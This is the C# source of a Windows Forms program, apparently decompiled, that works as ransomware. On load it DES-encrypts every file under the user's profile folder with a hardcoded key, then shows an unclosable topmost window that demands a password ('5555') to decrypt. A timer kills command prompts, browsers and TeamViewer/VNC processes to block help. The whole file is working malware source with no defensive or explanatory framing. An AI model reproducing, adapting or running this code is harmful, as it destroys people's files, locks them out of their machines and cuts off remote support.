using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Encoder91;

public class Form1 : Form
{
	internal class Encode
	{
		protected static byte[] a = new byte[5] { 62, 59, 25, 19, 37 };

		protected static readonly byte[] b = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };

		protected const string c = "YmFuIHRlYmUgZXNsaSB1em5hbCBldG90IGtvZA==";

		private static string Left(string a, int b)
		{
			return a.Substring(0, Math.Min(a.Length, b));
		}

		public static byte[] d(byte[] toDecode)
		{
			try
			{
				byte[] array = new byte[0];
				a = Encoding.UTF8.GetBytes(Left(Encoding.ASCII.GetString(Convert.FromBase64String("YmFuIHRlYmUgZXNsaSB1em5hbCBldG90IGtvZA==")), 8));
				DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
				array = toDecode;
				MemoryStream memoryStream = new MemoryStream();
				CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(a, b), CryptoStreamMode.Write);
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.FlushFinalBlock();
				return memoryStream.ToArray();
			}
			catch (Exception)
			{
				return null;
			}
		}

		public static byte[] e(byte[] toEncode)
		{
			try
			{
				a = Encoding.UTF8.GetBytes(Left(Encoding.ASCII.GetString(Convert.FromBase64String("YmFuIHRlYmUgZXNsaSB1em5hbCBldG90IGtvZA==")), 8));
				DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
				MemoryStream memoryStream = new MemoryStream();
				CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(a, b), CryptoStreamMode.Write);
				cryptoStream.Write(toEncode, 0, toEncode.Length);
				cryptoStream.FlushFinalBlock();
				return memoryStream.ToArray();
			}
			catch (Exception)
			{
				return null;
			}
		}
	}

	private static string[] nope = new string[14]
	{
		"ini", "rar", "db", "sys", "dat", "log1", "log2", "lnk", "bash_history", "gitconfig",
		"node_repl_history", "tm", "blf", "crypt"
	};

	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Timer timer1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = File.Exists("./crypt");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		if (!File.Exists("./crypt"))
		{
			Environment.Exit(0);
		}
		if (((Control)textBox1).get_Text() == "5555")
		{
			doIt("d");
			File.Delete("./crypt");
			MessageBox.Show("It is now safe to close this window");
		}
		else
		{
			MessageBox.Show("WRONG PASSWORD");
		}
	}

	private static string[] getIt(string path)
	{
		List<string> list = new List<string>();
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				int num = 0;
				string[] array = nope;
				foreach (string value in array)
				{
					if (text.ToLower().EndsWith(value))
					{
						num = 1;
						break;
					}
				}
				if (num != 1)
				{
					if (text == Process.GetCurrentProcess().MainModule!.FileName)
					{
						Console.WriteLine("Encrypting self is not allowed; skipping");
					}
					else
					{
						list.Add(text);
					}
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(getIt(path2));
			}
		}
		catch (Exception)
		{
		}
		return list.ToArray();
	}

	private void doIt(string d)
	{
		string[] it = getIt(Environment.GetEnvironmentVariable("USERPROFILE"));
		int num = 0;
		if (d == "e")
		{
			num = 0;
			string[] array = it;
			foreach (string path in array)
			{
				try
				{
					byte[] array2 = Encode.e(File.ReadAllBytes(path));
					if (array2 != null)
					{
						File.WriteAllBytes(path, array2);
						Console.Title = num + "/" + it.Length + " encoded";
						num++;
					}
				}
				catch (Exception)
				{
				}
			}
		}
		if (!(d == "d"))
		{
			return;
		}
		num = 0;
		string[] array3 = it;
		foreach (string path2 in array3)
		{
			try
			{
				byte[] array4 = Encode.d(File.ReadAllBytes(path2));
				if (array4 != null)
				{
					File.WriteAllBytes(path2, array4);
					Console.Title = num + "/" + it.Length + " decoded";
					num++;
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Directory.SetCurrentDirectory(Environment.GetEnvironmentVariable("USERPROFILE"));
		if (!File.Exists("./crypt"))
		{
			doIt("e");
			File.Create("./crypt");
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string[] source = new string[8] { "cmd", "sethc", "mspaint", "chrome", "iexplore", "tvnserver", "teamviewer", "teamviewer_desktop" };
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (source.Contains(process.ProcessName.ToLower()))
				{
					process.Kill();
				}
			}
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0254: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 19));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(157, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("To decrypt files, enter password");
		((Control)textBox1).set_Location(new Point(15, 35));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(244, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)button1).set_Location(new Point(187, 61));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(72, 23));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("OK");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		timer1.set_Enabled(true);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Form)this).set_AcceptButton((IButtonControl)(object)button1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(274, 96));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Everything is encrypted");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
